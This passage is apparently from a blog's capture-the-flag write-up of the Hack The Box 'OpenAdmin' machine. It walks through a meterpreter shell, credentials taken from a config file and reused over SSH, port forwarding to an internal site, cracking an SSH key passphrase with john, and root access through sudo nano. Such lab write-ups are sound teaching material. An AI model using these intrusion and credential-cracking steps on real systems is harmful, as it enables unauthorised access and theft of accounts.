egid=33) Alright, we got a foothold! Lets try spawning a tty shell. meterpreter &amp;gt; shell which python which python3 python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)' www-data@openadmin:/opt/ona/www$ Seems like we are in the web service’s directory. www-data@openadmin:/opt/ona/www$ ls -al -rw-rw-r-- 1 www-data www-data 1970 Jan 3 2018 .htaccess.example drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 config -rw-rw-r-- 1 www-data www-data 1949 Jan 3 2018 config_dnld.php -rw-rw-r-- 1 www-data www-data 4160 Jan 3 2018 dcm.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 images drwxrwxr-x 9 www-data www-data 4096 Jan 3 2018 include -rw-rw-r-- 1 www-data www-data 1999 Jan 3 2018 index.php drwxrwxr-x 5 www-data www-data 4096 Jan 3 2018 local -rw-rw-r-- 1 www-data www-data 4526 Jan 3 2018 login.php -rw-rw-r-- 1 www-data www-data 1106 Jan 3 2018 logout.php drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 modules drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 plugins drwxrwxr-x 2 www-data www-data 4096 Jan 3 2018 winc drwxrwxr-x 3 www-data www-data 4096 Jan 3 2018 workspace_plugins After some digging around, I only found database credentials in /opt/ona/www/local/config/database_settings.inc.php. $ /opt/ona/www/local/config/database_settings.inc.php &amp;lt;?php $ona_contexts=array ( 'DEFAULT' =&amp;gt; array ( 'databases' =&amp;gt; array ( 0 =&amp;gt; array ( 'db_type' =&amp;gt; 'mysqli', 'db_host' =&amp;gt; 'localhost', 'db_login' =&amp;gt; 'ona_sys', 'db_passwd' =&amp;gt; 'n1nj4W4rri0R!', 'db_database' =&amp;gt; 'ona_default', 'db_debug' =&amp;gt; false, ), ), 'description' =&amp;gt; 'Default data context', 'context_color' =&amp;gt; '#D3DBFF', ), ); ?&amp;gt; Moving on, I went to check what users were on the box. www-data@openadmin:/opt/ona/www$ ls -al /home drwxr-xr-x 4 root root 4096 Nov 22 18:00 . drwxr-xr-x 24 root root 4096 Nov 21 13:41 .. drwxr-x--- 6 jimmy jimmy 4096 May 1 00:44 jimmy drwxr-x--- 6 joanna joanna 4096 May 1 02:43 joanna With these 2 usernames and the password I found, I manually tried each possible combination and managed to log into jimmy. $ ssh jimmy@openadmin.htb jimmy@openadmin.htb's password: n1nj4W4rri0R! ... jimmy@openadmin:~$ id uid=1000(jimmy) gid=1000(jimmy) groups=1000(jimmy),1002(internal) Unfortunately, jimmy doesn’t have the user.txt, which means that joanna has it. It was hard to figure where to go next so I did some basic enumeration and found a very interesting port 52846 that was only exposed on the localhost interface. jimmy@openadmin:~$ netstat -peanut (Not all processes could be identified, non-owned process info will not be shown, you would have to be root to see it all.) Active Internet connections (servers and established) Proto Recv-Q Send-Q Local Address Foreign Address State User Inode PID/Program name tcp 0 0 127.0.0.1:3306 0.0.0.0:* LISTEN 111 20279 - tcp 0 0 127.0.0.1:52846 0.0.0.0:* LISTEN 0 20231 - tcp 0 0 127.0.0.53:53 0.0.0.0:* LISTEN 101 16729 - tcp 0 0 0.0.0.0:22 0.0.0.0:* LISTEN 0 20036 - ... Lets see if we can scan this port and see what service is running on it. But first, we will need to perform SSH port forwarding to our machine. $ ssh -L 1337:localhost:52846 jimmy@openadmin.htb jimmy@openadmin.htb's password: n1nj4W4rri0R! $ nmap -sV -sT -sC -p 1337 127.0.0.1 Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-01 03:31 EDT Nmap scan report for localhost (127.0.0.1) Host is up (0.000075s latency). PORT STATE SERVICE VERSION 1337/tcp open http Apache httpd 2.4.29 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Tutorialspoint.com Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 16.01 seconds There’s a website on that port! Lets try visiting it using our browser. I tried with the credentials I have so far and none of them worked, so I went to check the apache2 configs to see where are the webpages being stored at. jimmy@openadmin:/etc/apache2/sites-available$ ls -al total 24 drwxr-xr-x 2 root root 4096 Nov 23 17:13 . drwxr-xr-x 8 root root 4096 Nov 21 14:08 .. -rw-r--r-- 1 root root 6338 Jul 16 2019 default-ssl.conf -rw-r--r-- 1 root root 303 Nov 23 17:13 internal.conf -rw-r--r-- 1 root root 1329 Nov 22 14:24 openadmin.conf Checking each of the config, we find out that the web pages are at /var/www/internal and we also see some hints of joanna. jimmy@openadmin:/etc/apache2/sites-available$ cat internal.conf Listen 127.0.0.1:52846 &amp;lt;VirtualHost 127.0.0.1:52846&amp;gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal &amp;lt;IfModule mpm_itk_module&amp;gt; AssignUserID joanna joanna &amp;lt;/IfModule&amp;gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined &amp;lt;/VirtualHost&amp;gt; In the directory were 3 files. jimmy@openadmin:/var/www/internal$ ls -al total 20 drwxrwx--- 2 jimmy internal 4096 Nov 23 17:43 . drwxr-xr-x 4 root root 4096 Nov 22 18:15 .. -rwxrwxr-x 1 jimmy internal 3229 Nov 22 23:24 index.php -rwxrwxr-x 1 jimmy internal 185 Nov 23 16:37 logout.php -rwxrwxr-x 1 jimmy internal 339 Nov 23 17:40 main.php In index.php, we find the code used for the login page and the username and password hash were hard-coded in it! jimmy@openadmin:/var/www/internal$ cat index.php &amp;lt;?php $msg = ''; if (isset($_POST['login']) &amp;amp;&amp;amp; !empty($_POST['username']) &amp;amp;&amp;amp; !empty($_POST['password'])) { if ($_POST['username'] == 'jimmy' &amp;amp;&amp;amp; hash('sha512',$_POST['password']) == '00e302ccdcf1c60b8ad50ea50cf72b939705f49f40f0dc658801b4680b7d758eebdc2e9f9ba8ba3ef8a8bb9a796d34ba2e856838ee9bdde852b8ec3b3a0523b1') { $_SESSION['username'] = 'jimmy'; header(&quot;Location: /main.php&quot;); } else { $msg = 'Wrong username or password.'; } } ?&amp;gt; If we lookup the hash online, we get “Revealed”. Now, if we enter “jimmy” as the username and “Revealed” as the password, We got in! And we got a SSH private key? Checking the code for main.php(which was the the page we were redirected to), jimmy@openadmin:/var/www/internal$ cat main.php &amp;lt;?php session_start(); if (!isset ($_SESSION['username'])) { header(&quot;Location: /index.php&quot;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec('cat /home/joanna/.ssh/id_rsa'); echo &quot;&amp;lt;pre&amp;gt;$output&amp;lt;/pre&amp;gt;&quot;; ?&amp;gt; The private key belongs to user joanna. Lets try sshing using it. $ chmod 700 id_rsa $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key 'id_rsa': The private key is protected with a passphrase, so we use ssh2john along with john to crack the passphrase $ python /usr/share/john/ssh2john.py id_rsa &amp;gt; joanna.hash $ john --wordlist=/usr/share/wordlists/rockyou.txt joanna.hash Using default input encoding: UTF-8 Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64]) Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes Cost 2 (iteration count) is 1 for all loaded hashes Will run 6 OpenMP threads Note: This format may emit false positives, so it will keep trying even after finding a possible candidate. Press 'q' or Ctrl-C to abort, almost any other key for status bloodninjas (id_rsa) 1g 0:00:00:05 DONE (2020-05-01 05:12) 0.1858g/s 2665Kp/s 2665Kc/s 2665KC/s 1990..*7¡Vamos! Session completed user.txt Now, we can finally get our user.txt. $ ssh -i id_rsa joanna@openadmin.htb Enter passphrase for key 'id_rsa': bloodninjas ... joanna@openadmin:~$ cat user.txt c9b2XXXXXXXXXXXXXXXXXXXXXXXXXXXX Enumeration (2) If we list the commands we can run sudo with, joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv root.txt joanna can run nano as root! And according to GTFOBins, we can spawn a shell as root. Creating /opt/priv and running nano using sudo on /opt/priv: joanna@openadmin:~$ touch /opt/priv joanna@openadmin:~$ sudo /bin/nano /opt/priv Doing Ctrl+R and Ctrl+X: Executing the magical string and getting the flag: Rooted ! Thank you for reading and look forward for more writeups and articles !</summary></entry></feed>